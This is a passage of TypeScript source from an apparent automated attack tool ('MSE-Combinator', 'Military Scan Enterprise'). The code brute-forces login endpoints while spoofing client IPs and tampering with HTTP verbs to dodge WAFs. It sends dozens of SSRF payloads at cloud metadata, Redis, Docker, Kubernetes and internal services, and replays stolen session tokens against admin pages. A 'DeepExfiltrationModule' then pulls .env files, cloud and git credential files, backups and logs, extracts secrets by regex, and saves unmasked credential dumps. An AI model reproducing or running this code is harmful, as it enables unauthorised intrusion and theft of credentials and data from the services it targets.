    if (activeLoginEndpoints.length === 0) {
      activeLoginEndpoints.push("/login", "/api/auth/login");
    }

    const users = discoveredUsers.length > 0
      ? discoveredUsers.slice(0, 5)
      : ["admin", "root", "administrator", "test"];

    let successfulEntry = false;
    let capturedToken = "";

    const maxAttempts = Math.min(users.length * 3, 12);
    let attemptCount = 0;

    for (const user of users) {
      if (attemptCount >= maxAttempts) break;
      for (const ep of activeLoginEndpoints.slice(0, 2)) {
        if (attemptCount >= maxAttempts) break;

        const passwordsToTry = uniqueDict.slice(0, 3);
        for (const pwd of passwordsToTry) {
          if (attemptCount >= maxAttempts) break;
          attemptCount++;

          const methods = ["POST"];
          if (phase1.wafBlocked > 2) {
            methods.push("PUT");
          }

          for (const method of methods) {
            try {
              const controller = new AbortController();
              const timeout = setTimeout(() => controller.abort(), 4000);
              const resp = await fetch(`${baseUrl}${ep}`, {
                method,
                headers: {
                  "Content-Type": "application/json",
                  "User-Agent": "MSE-Combinator/2.0",
                  "X-Forwarded-For": `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`,
                },
                body: JSON.stringify({ username: user, email: user, password: pwd }),
                signal: controller.signal,
                redirect: "manual",
              });
              clearTimeout(timeout);

              const status = resp.status;
              const setCookie = resp.headers.get("set-cookie") || "";
              const hasNewSession = setCookie.includes("session") || setCookie.includes("token") || setCookie.includes("jwt");
              const body = await resp.text();
              const hasToken = /token|jwt|access_token|bearer/i.test(body);
              const isSuccess = (status === 200 && (hasNewSession || hasToken)) || status === 302;

              if (isSuccess) {
                successfulEntry = true;
                capturedToken = hasToken ? "[JWT_CAPTURED]" : hasNewSession ? "[SESSION_CAPTURED]" : "[REDIRECT_AUTH]";
              }

              phase3.attempts.push({
                user,
                endpoint: ep,
                method,
                status,
                hasNewSession,
                hasToken,
                rawResponsePreview: body.substring(0, 2000),
                verdict: isSuccess ? "ENTRY_GRANTED" : status === 403 ? "WAF_BLOCKED" : status === 429 ? "RATE_LIMITED" : "DENIED",
                wafEvasion: method !== "POST" ? "HTTP_VERB_TAMPER" : "NONE",
              });

              if (isSuccess) break;
            } catch (err: any) {
              phase3.attempts.push({
                user,
                endpoint: ep,
                method,
                status: 0,
                verdict: "ERROR",
                error: err.message?.substring(0, 60),
              });
            }
          }
        }
      }
    }
    phase3.completedAt = Date.now();
    phase3.totalAttempts = phase3.attempts.length;
    phase3.wafBlockedCount = phase3.attempts.filter((a: any) => a.verdict === "WAF_BLOCKED").length;
    phase3.rateLimitedCount = phase3.attempts.filter((a: any) => a.verdict === "RATE_LIMITED").length;
    phase3.entriesGranted = phase3.attempts.filter((a: any) => a.verdict === "ENTRY_GRANTED").length;
    phases.push(phase3);

    const phase4: any = {
      phase: "PHASE_4_SSRF_INTERNAL_AUTH",
      label: "SSRF Internal Auth Tunnel",
      probes: [],
      rawCaptures: [] as { tunnel: string; path: string; contentLength: number; contentPreview: string; sensitiveKeys: string[] }[],
      startedAt: Date.now(),
    };

    const ssrfTunnels = [
      { path: "/api/proxy?url=http://admin-internal/login", desc: "Internal admin proxy", category: "auth" },
      { path: "/api/proxy?url=http://localhost:8080/admin", desc: "Localhost admin tunnel", category: "auth" },
      { path: "/api/proxy?url=http://localhost:6379/INFO", desc: "Redis INFO dump", category: "redis" },
      { path: "/api/proxy?url=http://redis:6379/INFO", desc: "Redis cluster INFO", category: "redis" },
      { path: "/api/proxy?url=http://localhost:6379/KEYS%20*", desc: "Redis KEYS * enumeration", category: "redis" },
      { path: "/api/proxy?url=http://redis:6379/KEYS%20*", desc: "Redis cluster KEYS *", category: "redis" },
      { path: "/api/proxy?url=http://localhost:6379/GET%20sess:1", desc: "Redis session GET sess:1", category: "redis" },
      { path: "/api/proxy?url=http://localhost:6379/GET%20sess:2", desc: "Redis session GET sess:2", category: "redis" },
      { path: "/api/proxy?url=http://localhost:6379/GET%20sess:3", desc: "Redis session GET sess:3", category: "redis" },
      { path: "/api/proxy?url=http://localhost:6379/GET%20sess:4", desc: "Redis session GET sess:4", category: "redis" },
      { path: "/api/proxy?url=http://localhost:6379/GET%20sess:5", desc: "Redis session GET sess:5", category: "redis" },
      { path: "/api/proxy?url=http://localhost:6379/GET%20session:1", desc: "Redis GET session:1", category: "redis" },
      { path: "/api/proxy?url=http://localhost:6379/GET%20session:2", desc: "Redis GET session:2", category: "redis" },
      { path: "/api/proxy?url=http://localhost:6379/GET%20session:3", desc: "Redis GET session:3", category: "redis" },
      { path: "/api/proxy?url=http://localhost:6379/GET%20session:4", desc: "Redis GET session:4", category: "redis" },
      { path: "/api/proxy?url=http://localhost:6379/GET%20session:5", desc: "Redis GET session:5", category: "redis" },
      { path: "/api/proxy?url=http://localhost:2375/containers/json", desc: "Docker API containers", category: "docker" },
      { path: "/api/proxy?url=http://localhost:2375/info", desc: "Docker daemon info", category: "docker" },
      { path: "/api/proxy?url=http://localhost:2375/containers/json?all=true&filters=%7B%7D", desc: "Docker ENV inspect", category: "docker" },
      { path: "/api/proxy?url=http://169.254.169.254/latest/meta-data/", desc: "AWS IMDSv1 metadata", category: "cloud" },
      { path: "/api/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/", desc: "AWS IAM credentials", category: "cloud" },
      { path: "/api/proxy?url=http://169.254.169.254/latest/dynamic/instance-identity/document", desc: "AWS instance identity", category: "cloud" },
      { path: "/api/internal/auth", desc: "Internal auth endpoint", category: "auth" },
      { path: "/api/v1/internal/users", desc: "Internal user enumeration", category: "auth" },
      { path: "/api/proxy?url=http://localhost:8500/v1/kv/?recurse", desc: "Consul KV store", category: "infra" },
      { path: "/api/proxy?url=http://localhost:2379/v2/keys/", desc: "etcd key store", category: "infra" },
       // NOVOS: Kubernetes
  { path: "/api/proxy?url=http://localhost:10250/pods", desc: "Kubelet API - list pods", category: "k8s" },
  { path: "/api/proxy?url=http://localhost:10250/exec/default/nginx/nginx?command=id", desc: "Kubelet exec - container", category: "k8s" },
  { path: "/api/proxy?url=https://kubernetes.default.svc/api/v1/secrets", desc: "K8s secrets API", category: "k8s" },

  // NOVOS: Cloud Metadata mais agressivos
  { path: "/api/proxy?url=http://169.254.169.254/latest/user-data", desc: "AWS user-data", category: "cloud" },
  { path: "/api/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/admin", desc: "AWS IAM role 'admin'", category: "cloud" },
  { path: "/api/proxy?url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token", desc: "GCP access token", headers: {"Metadata-Flavor":"Google"}, category: "cloud" },
  { path: "/api/proxy?url=http://169.254.169.254/metadata/instance?api-version=2021-02-01", desc: "Azure metadata", headers: {"Metadata":"true"}, category: "cloud" },

  // NOVOS: Databases internos
  { path: "/api/proxy?url=http://localhost:5432/postgres", desc: "PostgreSQL probe", category: "database" },
  { path: "/api/proxy?url=http://localhost:27017/test", desc: "MongoDB probe", category: "database" },
  { path: "/api/proxy?url=http://localhost:3306/mysql", desc: "MySQL probe", category: "database" },
  { path: "/api/proxy?url=http://localhost:9200/_cat/indices", desc: "Elasticsearch indices", category: "database" },

  // NOVOS: Message queues
  { path: "/api/proxy?url=http://localhost:5672/api/queues", desc: "RabbitMQ management", category: "queue" },
  { path: "/api/proxy?url=http://localhost:9092/v3/clusters", desc: "Kafka API", category: "queue" },

  // NOVOS: CI/CD
  { path: "/api/proxy?url=http://localhost:8080/jenkins/manage", desc: "Jenkins internal", category: "cicd" },
  { path: "/api/proxy?url=http://localhost:9000/api/settings", desc: "SonarQube API", category: "cicd" },

  // NOVOS: Cache
  { path: "/api/proxy?url=http://localhost:11211/stats", desc: "Memcached stats", category: "cache" },

  // NOVOS: Auto-descoberta
  { path: "/api/proxy?url=http://localhost:8500/v1/agent/services", desc: "Consul services", category: "discovery" },
  { path: "/api/proxy?url=http://localhost:8761/eureka/apps", desc: "Eureka registry", category: "discovery" },
    ];

    for (const tunnel of ssrfTunnels) {
      try {
        const controller = new AbortController();
        const timeout = setTimeout(() => controller.abort(), 4000);
        const resp = await fetch(`${baseUrl}${tunnel.path}`, {
          method: "GET",
          headers: { "User-Agent": "MSE-Combinator/2.0" },
          signal: controller.signal,
          redirect: "manual",
        });
        clearTimeout(timeout);
        const status = resp.status;
        const rawBody = await resp.text();
        const body = rawBody;
        const leaksData = /user|admin|token|password|email|key|secret|redis_version|docker|container|iam|credential|access.key/i.test(body);

        const probeResult: any = {
          tunnel: tunnel.desc,
          path: tunnel.path,
          category: tunnel.category,
          status,
          leaksData,
          contentLength: rawBody.length,
          verdict: status === 200 && leaksData ? "TUNNEL_OPEN" : status === 200 ? "ACCESSIBLE" : "BLOCKED",
        };

        if (status === 200 && rawBody.length > 0) {
          const sensitiveKeys: string[] = [];
          if (/password|passwd|pwd|DB_PASSWORD/i.test(body)) sensitiveKeys.push("PASSWORD");
          if (/secret|api.?key|auth.?token|JWT_SECRET|AUTH_TOKEN/i.test(body)) sensitiveKeys.push("API_KEY");
          if (/redis_version|redis_mode/i.test(body)) sensitiveKeys.push("REDIS_INFO");
          if (/sess:|session:|token:|auth:/i.test(body)) sensitiveKeys.push("SESSION_TOKEN");
          if (/container|docker|image/i.test(body)) sensitiveKeys.push("DOCKER_DATA");
          if (/iam|access.?key|secret.?access|AKIA[0-9A-Z]{16}/i.test(body)) sensitiveKeys.push("AWS_CREDENTIALS");
          if (/mongo|mysql|postgres|database|DB_HOST|DB_CONNECTION/i.test(body)) sensitiveKeys.push("DB_CREDENTIALS");
          if (/consul|etcd|vault/i.test(body)) sensitiveKeys.push("SERVICE_DISCOVERY");
          if (/firebase|firebaseio\.com|FIREBASE_API_KEY/i.test(body)) sensitiveKeys.push("FIREBASE");
          if (/AIza[0-9A-Za-z_-]{35}|GOOGLE_API_KEY|GCLOUD/i.test(body)) sensitiveKeys.push("GOOGLE_API");
          if (/STRIPE_SECRET|sk_live_|sk_test_/i.test(body)) sensitiveKeys.push("STRIPE_KEY");

          probeResult.sensitiveKeys = sensitiveKeys;
          probeResult.rawCaptured = true;
          probeResult.rawPreview = body;

          phase4.rawCaptures.push({
            tunnel: tunnel.desc,
            path: tunnel.path,
            contentLength: rawBody.length,
            contentPreview: body,
            sensitiveKeys,
          });
        }

        phase4.probes.push(probeResult);
      } catch (err: any) {
        phase4.probes.push({ tunnel: tunnel.desc, path: tunnel.path, category: tunnel.category, status: 0, verdict: "TIMEOUT" });
      }
    }
    phase4.completedAt = Date.now();
    phase4.tunnelsOpen = phase4.probes.filter((p: any) => p.verdict === "TUNNEL_OPEN").length;
    phase4.accessible = phase4.probes.filter((p: any) => p.verdict === "ACCESSIBLE").length;
    phase4.rawCaptureCount = phase4.rawCaptures.length;

    const redisCaptures = phase4.probes.filter((p: any) => p.category === "redis" && (p.verdict === "TUNNEL_OPEN" || p.verdict === "ACCESSIBLE"));
    if (redisCaptures.length > 0 && await allowDump("redis_raw_dump")) {
      const ts = new Date().toISOString().replace(/[:.]/g, "-").substring(0, 19);
      const redisContent = [
        "MSE - REDIS RAW SESSION DUMP",
        `TARGET: ${validation.url}`,
        `TIMESTAMP: ${new Date().toISOString()}`,
        `TUNNELS OPEN: ${redisCaptures.length}`,
        `PROTOCOL: Raw Capture - Zero Masking`,
        "",
        ...redisCaptures.map((rc: any) => [
          `--- ${rc.tunnel} (${rc.path}) ---`,
          `Status: ${rc.status} | Content: ${rc.contentLength} bytes`,
          `Sensitive Keys: ${(rc.sensitiveKeys || []).join(", ") || "NONE"}`,
          `Raw Data:`,
          rc.rawPreview || "(no data captured)",
          "",
        ].join("\n")),
      ].join("\n");
      const redisDumpFilename = `Redis-Session-Dump-${ts}.txt`;
      const redisSize = writeDumpFile(redisDumpFilename, redisContent);
      dumpRegistry.unshift({
        id: generateDumpId(),
        category: "session_tokens",
        filename: redisDumpFilename,
        label: `Redis Session Dump - ${redisCaptures.length} tunnels`,
        target: validation.url,
        severity: "critical",
        itemCount: redisCaptures.length,
        sizeBytes: redisSize,
        createdAt: new Date().toISOString(),
        scanId: "combinator-redis-dump",
      });
      if (dumpRegistry.length > 100) dumpRegistry.splice(100);
      log(`[COMBINATOR] Redis raw session dump -> ${redisDumpFilename} (${redisSize} bytes, ${redisCaptures.length} tunnels)`, "admin");
    } else if (redisCaptures.length > 0) {
      log("[COMBINATOR] Redis raw session dump ignorado por limite/intervalo de segurança", "admin");
    }

    const phase5: any = {
      phase: "PHASE_5_TOKEN_INJECTION",
      label: "Pass-the-Hash / Token Injection",
      injections: [],
      startedAt: Date.now(),
    };

    const tokensToInject = sessionTokens.slice(0, 5);

    for (const token of tokensToInject) {
      for (const ep of ["/admin", "/api/admin", "/dashboard"]) {
        try {
          const controller = new AbortController();
          const timeout = setTimeout(() => controller.abort(), 4000);
          const resp = await fetch(`${baseUrl}${ep}`, {
            method: "GET",
            headers: {
              "User-Agent": "MSE-Combinator/2.0",
              "Cookie": `session=${token}; token=${token}`,
              "Authorization": `Bearer ${token}`,
            },
            signal: controller.signal,
            redirect: "manual",
          });
          clearTimeout(timeout);
          const status = resp.status;
          const body = (await resp.text()).substring(0, 300);
          const hasPrivilegedContent = /dashboard|admin|settings|user.*manage|configuration/i.test(body);

          phase5.injections.push({
            tokenRaw: token,
            endpoint: ep,
            status,
            hasPrivilegedContent,
            verdict: status === 200 && hasPrivilegedContent ? "ESCALATED" : status === 200 ? "ACCEPTED" : "REJECTED",
          });
        } catch {
          phase5.injections.push({ tokenRaw: token, endpoint: ep, status: 0, verdict: "ERROR" });
        }
      }
    }
    phase5.completedAt = Date.now();
    phase5.escalated = phase5.injections.filter((i: any) => i.verdict === "ESCALATED").length;
    phase5.accepted = phase5.injections.filter((i: any) => i.verdict === "ACCEPTED").length;
    phases.push(phase5);

    const ssrfSuccessful = phase4.tunnelsOpen > 0 || phase4.accessible > 0;
    const tokenSuccessful = phase5.escalated > 0;
    const deepExtractionTriggered = ssrfSuccessful || tokenSuccessful || successfulEntry;

    const phase6: any = {
      phase: "PHASE_6_DEEP_EXTRACTION",
      label: "DeepExtractionModule — Raw Dump",
      triggered: deepExtractionTriggered,
      triggerReason: ssrfSuccessful ? "SSRF_SUCCESS" : tokenSuccessful ? "TOKEN_ESCALATION" : successfulEntry ? "AUTH_ENTRY" : "NOT_TRIGGERED",
      extractions: [],
      dumpFiles: [] as { filename: string; category: string; sizeBytes: number; itemCount: number }[],
      startedAt: Date.now(),
    };

    if (deepExtractionTriggered) {
      log(`[COMBINATOR] DeepExtractionModule ACTIVATED — trigger: ${phase6.triggerReason} → ${target}`, "admin");

      const extractionTargets = [
        { path: "/.env", desc: "Environment Variables (.env)", category: "config_files", fileType: "env" },
        { path: "/config.js", desc: "Config JS", category: "config_files", fileType: "js" },
        { path: "/config.json", desc: "Config JSON", category: "config_files", fileType: "json" },
        { path: "/api/config", desc: "API Config endpoint", category: "config_files", fileType: "json" },
        { path: "/.env.production", desc: "Production .env", category: "config_files", fileType: "env" },
        { path: "/.env.local", desc: "Local .env", category: "config_files", fileType: "env" },
        { path: "/wp-config.php", desc: "WordPress config", category: "config_files", fileType: "php" },
        { path: "/web.config", desc: "IIS web.config", category: "config_files", fileType: "xml" },
        { path: "/api/debug/vars", desc: "Debug Variables", category: "infra_secrets", fileType: "json" },
        { path: "/api/env", desc: "Environment API", category: "infra_secrets", fileType: "json" },
        { path: "/server-status", desc: "Apache server-status", category: "infra_secrets", fileType: "html" },
        { path: "/nginx_status", desc: "Nginx status", category: "infra_secrets", fileType: "txt" },
        { path: "/.git/config", desc: "Git config exposure", category: "infra_secrets", fileType: "txt" },
        { path: "/docker-compose.yml", desc: "Docker Compose", category: "infra_secrets", fileType: "yml" },
        { path: "/Dockerfile", desc: "Dockerfile exposure", category: "infra_secrets", fileType: "txt" },
        { path: "/api/proxy?url=http://localhost:6379/CONFIG%20GET%20*", desc: "Redis CONFIG dump", category: "database", fileType: "txt" },
        { path: "/api/proxy?url=http://redis:6379/CONFIG%20GET%20*", desc: "Redis cluster CONFIG", category: "database", fileType: "txt" },
        { path: "/api/proxy?url=http://localhost:6379/KEYS%20*", desc: "Redis KEYS dump", category: "database", fileType: "txt" },
        { path: "/api/proxy?url=http://localhost:2375/containers/json?all=true", desc: "Docker all containers", category: "infra_secrets", fileType: "json" },
        { path: "/api/proxy?url=http://localhost:2375/images/json", desc: "Docker images list", category: "infra_secrets", fileType: "json" },
        { path: "/api/proxy?url=http://localhost:2375/networks", desc: "Docker networks", category: "infra_secrets", fileType: "json" },
        { path: "/api/proxy?url=http://169.254.169.254/latest/user-data", desc: "AWS user-data", category: "infra_secrets", fileType: "txt" },
        { path: "/api/proxy?url=http://169.254.169.254/latest/dynamic/instance-identity/document", desc: "AWS instance identity", category: "infra_secrets", fileType: "json" },
        { path: "/.aws/credentials", desc: "AWS CLI credentials", category: "infra_secrets", fileType: "txt" },
  { path: "/.aws/config", desc: "AWS CLI config", category: "infra_secrets", fileType: "txt" },
  { path: "/.azure/accessTokens.json", desc: "Azure tokens", category: "infra_secrets", fileType: "json" },
  { path: "/.gcloud/credentials.json", desc: "GCP credentials", category: "infra_secrets", fileType: "json" },
  { path: "/.kube/config", desc: "Kubernetes config", category: "infra_secrets", fileType: "yml" },
  { path: "/.docker/config.json", desc: "Docker auth", category: "infra_secrets", fileType: "json" },
  { path: "/.npmrc", desc: "NPM auth token", category: "infra_secrets", fileType: "txt" },
  { path: "/.yarnrc.yml", desc: "Yarn auth", category: "infra_secrets", fileType: "yml" },
  { path: "/.netrc", desc: "Netrc credentials", category: "infra_secrets", fileType: "txt" },
  { path: "/.git-credentials", desc: "Git credentials", category: "infra_secrets", fileType: "txt" },

  // NOVOS: Backups
  { path: "/backup.sql", desc: "Database backup", category: "database", fileType: "sql" },
  { path: "/dump.sql", desc: "SQL dump", category: "database", fileType: "sql" },
  { path: "/backup.tar.gz", desc: "Full backup", category: "database", fileType: "tar" },

  // NOVOS: Logs sensíveis
  { path: "/var/log/auth.log", desc: "SSH auth logs", category: "infra_secrets", fileType: "log" },
  { path: "/var/log/secure", desc: "Linux secure log", category: "infra_secrets", fileType: "log" },
  { path: "/var/log/messages", desc: "System messages", category: "infra_secrets", fileType: "log" },
      ];

      for (const ext of extractionTargets) {
        try {
          const controller = new AbortController();
          const timeout = setTimeout(() => controller.abort(), 4000);
          const resp = await fetch(`${baseUrl}${ext.path}`, {
            method: "GET",
            headers: { "User-Agent": "MSE-Combinator/2.0" },
            signal: controller.signal,
            redirect: "manual",
          });
          clearTimeout(timeout);
          const status = resp.status;
          const rawBody = await resp.text();
          const bodyLen = rawBody.length;

          const isSuccess = status === 200 && bodyLen > 10;
          const isSensitive = isSuccess && /password|secret|key|token|credential|database|redis|docker|aws|firebase|mongo|mysql|postgres/i.test(rawBody);

          const extraction: any = {
            target: ext.path,
            desc: ext.desc,
            category: ext.category,
            status,
            contentLength: bodyLen,
            extracted: isSuccess,
            sensitive: isSensitive,
            verdict: isSensitive ? "EXTRACTED_SENSITIVE" : isSuccess ? "EXTRACTED" : status === 403 ? "WAF_BLOCKED" : "NOT_FOUND",
          };

          if (isSuccess) {
            extraction.preview = rawBody.replace(/[\r\n]+/g, " ");

            const EXFIL_PATTERNS = [
              { pattern: /(?:^|\s|=|:)([A-Za-z0-9_]*(?:PASSWORD|PASSWD|PWD|DB_PASSWORD|ADMIN_PASSWORD|ROOT_PASSWORD|MYSQL_PASSWORD)[A-Za-z0-9_]*)\s*[=:]\s*["']?([^\s"'\n]{1,500})["']?/gim, type: "PASSWORD" },
              { pattern: /(?:^|\s|=|:)([A-Za-z0-9_]*(?:SECRET|PRIVATE[_.]?KEY|AUTH[_.]?TOKEN|JWT_SECRET|SESSION_SECRET|COOKIE_SECRET|ENCRYPTION_KEY)[A-Za-z0-9_]*)\s*[=:]\s*["']?([^\s"'\n]{1,500})["']?/gim, type: "SECRET" },
              { pattern: /(?:^|\s|=|:)([A-Za-z0-9_]*(?:API[_.]?KEY|ACCESS[_.]?KEY|APP[_.]?KEY|GOOGLE_API_KEY|OPENAI_API_KEY|SENDGRID_KEY)[A-Za-z0-9_]*)\s*[=:]\s*["']?([^\s"'\n]{6,500})["']?/gim, type: "KEY" },
              { pattern: /(?:^|\s|=|:)([A-Za-z0-9_]*(?:DATABASE[_.]?URL|REDIS[_.]?URL|MONGO[_.]?URI|DB[_.]?HOST|DB[_.]?CONNECTION|POSTGRES[_.]?URL|MYSQL[_.]?URL)[A-Za-z0-9_]*)\s*[=:]\s*["']?([^\s"'\n]{6,500})["']?/gim, type: "URL" },
              { pattern: /(?:^|\s|=|:)([A-Za-z0-9_]*(?:AWS[_.]?ACCESS|AWS[_.]?SECRET|FIREBASE|FIREBASE_API_KEY|STRIPE[_.]?KEY|STRIPE_SECRET)[A-Za-z0-9_]*)\s*[=:]\s*["']?([^\s"'\n]{6,500})["']?/gim, type: "CLOUD_CREDENTIAL" },
              { pattern: /(AKIA[0-9A-Z]{16})\s*[=:,\s]\s*["']?([A-Za-z0-9+\/=]{30,60})["']?/gm, type: "AWS_KEY_PAIR" },
              { pattern: /(AIza[0-9A-Za-z_-]{35})/gm, type: "GOOGLE_API_KEY" },
              { pattern: /([a-z0-9-]+\.firebaseio\.com)/gim, type: "FIREBASE_URL" },
              { pattern: /(sk_live_[A-Za-z0-9]{24,}|sk_test_[A-Za-z0-9]{24,})/gm, type: "STRIPE_SECRET_KEY" },
              { pattern: /(ghp_[A-Za-z0-9]{36}|github_pat_[A-Za-z0-9_]{22,})/gm, type: "GITHUB_TOKEN" },
            ];

            const extractedVars: { key: string; value: string; type: string }[] = [];
            const scanText = rawBody;
            for (const { pattern, type } of EXFIL_PATTERNS) {
              let match;
              const regex = new RegExp(pattern.source, pattern.flags);
              while ((match = regex.exec(scanText)) !== null) {
                const key = match[1]?.trim();
                const value = match[2]?.trim();
                if (key && value && value.length > 2) {
                  extractedVars.push({ key, value, type });
                }
              }
            }

            const uniqueVars = extractedVars.filter((v, i, arr) => arr.findIndex(x => x.key === v.key) === i);
            extraction.credentialsFound = uniqueVars.length;
            extraction.credentialTypes = [...new Set(uniqueVars.map(v => v.type))];

            const ts = new Date().toISOString().replace(/[:.]/g, "-").substring(0, 19);
            const safeDesc = ext.desc.replace(/[^a-zA-Z0-9]/g, "-").substring(0, 30);

            let dumpContent: string;
            let dumpFilename: string;

            if (uniqueVars.length > 0) {
              const envContent = [
                `# ═══════════════════════════════════════════════════`,
                `# MSE DeepExfiltrationModule v2.0 — CREDENTIAL DUMP`,
                `# SOURCE: ${ext.desc}`,
                `# PATH: ${ext.path}`,
                `# TARGET: ${validation.url}`,
                `# TRIGGER: ${phase6.triggerReason}`,
                `# TIMESTAMP: ${new Date().toISOString()}`,
                `# CREDENTIALS EXTRACTED: ${uniqueVars.length}`,
                `# TYPES: ${[...new Set(uniqueVars.map(v => v.type))].join(", ")}`,
                `# ═══════════════════════════════════════════════════`,
                ``,
                ...uniqueVars.map(v => `# [${v.type}]`).filter((_, i, arr) => arr.indexOf(arr[i]) === i),
                ...uniqueVars.map(v => `${v.key}=${v.value}`),
                ``,
                `# --- RAW SOURCE UNMASKED (first 10000 chars) ---`,
                `# ${rawBody.replace(/\n/g, "\n# ")}`,
              ].join("\n");
              dumpFilename = `Exfil-Credentials-${safeDesc}-${ts}.env`;
              dumpContent = envContent;

              const jsonDumpContent = JSON.stringify({
                _header: {
                  tool: "Military Scan Enterprise",
                  module: "DeepExfiltrationModule",
                  type: "CREDENTIAL_EXTRACTION",
                  source: ext.desc,
                  target: validation.url,
                  extraction_path: ext.path,
                  timestamp: new Date().toISOString(),
                  trigger: phase6.triggerReason,
                  clearance: "ADMIN",
                  total_credentials: uniqueVars.length,
                },
                credentials: uniqueVars.map(v => ({
                  key: v.key,
                  value: v.value,
                  type: v.type,
                  severity: v.type === "PASSWORD" || v.type === "CLOUD_CREDENTIAL" ? "CRITICAL" : "HIGH",
                })),
                raw_source_unmasked: rawBody,
              }, null, 2);
              const jsonFilename = `Exfil-Credentials-${safeDesc}-${ts}.json`;
              if (!(await allowDump("deep_extract_json"))) {
                log("[COMBINATOR] JSON credential dump ignorado por limite de dumps", "admin");
              } else {
                const jsonSize = writeDumpFile(jsonFilename, jsonDumpContent);
                dumpRegistry.unshift({
                  id: generateDumpId(),
                  category: ext.category,
                  filename: jsonFilename,
                  label: `Credential Dump (JSON): ${ext.desc}  ${uniqueVars.length} keys`,
                  target: validation.url,
                  severity: "critical",
                  itemCount: uniqueVars.length,
                  sizeBytes: jsonSize,
                  createdAt: new Date().toISOString(),
                  scanId: "combinator-exfil",
                });
                if (dumpRegistry.length > 100) dumpRegistry.splice(100);
                phase6.dumpFiles.push({ filename: jsonFilename, category: ext.category, sizeBytes: jsonSize, itemCount: uniqueVars.length });
                log(`[COMBINATOR] Exfil JSON: ${ext.desc} â†’ ${jsonFilename} (${uniqueVars.length} credentials)`, "admin");
              }
            } else if (ext.fileType === "json") {
              dumpFilename = `DeepExtract-${safeDesc}-${ts}.json`;
              try {
                const parsed = JSON.parse(rawBody);
                dumpContent = JSON.stringify({
                  _header: {
                    tool: "Military Scan Enterprise",
                    module: "DeepExfiltrationModule",
                    type: "RAW_EXTRACTION",
                    source: ext.desc,
                    target: validation.url,
                    extraction_path: ext.path,
                    timestamp: new Date().toISOString(),
                    trigger: phase6.triggerReason,
                    clearance: "ADMIN",
                  },
                  raw_data: parsed,
                }, null, 2);
              } catch {
                dumpContent = JSON.stringify({
                  _header: {
                    tool: "Military Scan Enterprise",
                    module: "DeepExfiltrationModule",
                    type: "RAW_EXTRACTION",
                    source: ext.desc,
                    target: validation.url,
                    extraction_path: ext.path,
                    timestamp: new Date().toISOString(),
                    trigger: phase6.triggerReason,
                  },
                  raw_text: rawBody,
                }, null, 2);
              }
            } else {
              dumpFilename = `DeepExtract-${safeDesc}-${ts}.txt`;
              dumpContent = [
                "═══════════════════════════════════════════════════════",
                "  MSE — DEEP EXFILTRATION MODULE v2.0",
                `  SOURCE: ${ext.desc}`,
                `  PATH: ${ext.path}`,
                `  TARGET: ${validation.url}`,
                `  TRIGGER: ${phase6.triggerReason}`,
                `  TIMESTAMP: ${new Date().toISOString()}`,
                `  CONTENT-LENGTH: ${bodyLen} bytes`,
                `  SENSITIVITY: ${isSensitive ? "HIGH — CONTAINS CREDENTIALS/KEYS" : "STANDARD"}`,
                `  CREDENTIALS FOUND: ${uniqueVars.length}`,
                "═══════════════════════════════════════════════════════",
                "",
                "--- RAW CONTENT BEGIN ---",
                rawBody,
                "--- RAW CONTENT END ---",
                "",
              ].join("\n");
            }

            if (!(await allowDump("deep_extract"))) {
              log("[COMBINATOR] Dump ignorado (deep_extract) por limite de credenciais reais/ritmo", "admin");
              continue;
            }
            const sizeBytes = writeDumpFile(dumpFilename, dumpContent);
            const dumpEntry: DumpFile = {
              id: generateDumpId(),
              category: ext.category,
              filename: dumpFilename,
              label: uniqueVars.length > 0 ? `Exfil: ${ext.desc} — ${uniqueVars.length} credentials` : `Deep Extract: ${ext.desc}`,
              target: validation.url,
              severity: isSensitive || uniqueVars.length > 0 ? "critical" : "high",
              itemCount: uniqueVars.length > 0 ? uniqueVars.length : 1,
              sizeBytes,
              createdAt: new Date().toISOString(),
              scanId: "combinator-deep-extract",
            };
            dumpRegistry.unshift(dumpEntry);
            if (dumpRegistry.length > 100) dumpRegistry.splice(100);

            extraction.dumpFile = dumpFilename;
            extraction.dumpSize = sizeBytes;

            phase6.dumpFiles.push({
              filename: dumpFilename,
              category: ext.category,
              sizeBytes,
              itemCount: uniqueVars.length > 0 ? uniqueVars.length : 1,
            });

            log(`[COMBINATOR] DeepExfil: ${ext.desc} → ${dumpFilename} (${sizeBytes} bytes, ${uniqueVars.length} credentials)`, "admin");
          }

          phase6.extractions.push(extraction);
        } catch (err: any) {
          phase6.extractions.push({
            target: ext.path,
            desc: ext.desc,
            category: ext.category,
            status: 0,
            extracted: false,
            verdict: "TIMEOUT",
          });
        }
      }

      if (phase4.rawCaptures.length > 0) {
        const ts = new Date().toISOString().replace(/[:.]/g, "-").substring(0, 19);
        const ssrfDumpContent = JSON.stringify({
          _header: {
            tool: "Military Scan Enterprise",
            module: "DeepExtractionModule",
            type: "SSRF_RAW_CAPTURES",
            target: validation.url,
            timestamp: new Date().toISOString(),
            trigger: phase6.triggerReason,
            totalCaptures: phase4.rawCaptures.length,
          },
          captures: phase4.rawCaptures.map((c: any) => ({
            tunnel: c.tunnel,
            path: c.path,
            contentLength: c.contentLength,
            sensitiveKeys: c.sensitiveKeys,
            preview: c.contentPreview,
          })),
        }, null, 2);
        const ssrfFilename = `SSRF-Raw-Captures-${ts}.json`;
        if (!(await allowDump("ssrf_raw"))) {
          log("[COMBINATOR] SSRF raw capture dump ignorado por limite de dumps", "admin");
        } else {
          const ssrfSize = writeDumpFile(ssrfFilename, ssrfDumpContent);
          dumpRegistry.unshift({
            id: generateDumpId(),
            category: "infra_secrets",
            filename: ssrfFilename,
            label: `SSRF Raw Captures  ${phase4.rawCaptures.length} tunnels`,
            target: validation.url,
            severity: "critical",
            itemCount: phase4.rawCaptures.length,
            sizeBytes: ssrfSize,
            createdAt: new Date().toISOString(),
            scanId: "combinator-ssrf-capture",
          });
          if (dumpRegistry.length > 100) dumpRegistry.splice(100);

          phase6.dumpFiles.push({
            filename: ssrfFilename,
            category: "infra_secrets",
            sizeBytes: ssrfSize,
            itemCount: phase4.rawCaptures.length,
          });

          log(`[COMBINATOR] SSRF raw captures dumped â†’ ${ssrfFilename} (${ssrfSize} bytes)`, "admin");
        }



      }

    }

    phase6.completedAt = Date.now();
    phase6.totalExtracted = phase6.extractions.filter((e: any) => e.extracted).length;
    phase6.sensitiveExtracted = phase6.extractions.filter((e: any) => e.sensitive).length;
